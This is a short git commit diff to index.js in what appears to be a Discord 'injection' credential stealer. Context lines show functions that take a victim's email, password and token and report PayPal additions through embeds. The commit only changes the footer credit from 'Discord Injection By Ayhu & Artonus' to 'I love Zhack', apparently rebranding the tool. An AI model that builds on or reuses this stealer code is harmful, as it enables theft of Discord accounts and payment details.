ea0e8bfd0c2de05d36215dbdf87bf6ee4bfebf70
ByteSleuths <150552235+ByteSleuths@users.noreply.github.com>
2024-02-16 16:24:44 +0100

    Update index.js

--- index.js
+++ index.js
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '🎉・I love Zhack',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '🎉・I love Zhack',
         },
       },
     ],
